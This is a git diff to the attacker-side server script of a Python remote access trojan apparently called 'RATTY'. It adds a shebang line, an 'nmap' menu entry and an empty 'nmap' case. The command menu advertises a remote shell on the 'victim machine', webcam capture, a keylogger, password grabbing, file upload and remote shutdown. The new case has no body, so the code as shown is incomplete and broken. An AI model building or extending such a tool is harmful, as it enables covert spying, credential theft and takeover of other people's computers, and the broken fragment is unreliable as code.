@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+
+
 import socket, subprocess
 from pyfiglet import Figlet
 
@@ -55,7 +58,7 @@ class SERVER:
         
     # prompts given to the user to run commands in the cli    
     def prompts(self):
-        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload <file>                 uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
+        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload <file>                 uploads file              nmap \n             \n help                         show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
         
     def mainloop(self):
         self.rattylogo()
@@ -107,6 +110,9 @@ class SERVER:
             
                 case 'help':
                     self.prompts()
+
+                case 'nmap':
+                    
                 
                 case 'exit':
                     f = Figlet(font='isometric2')
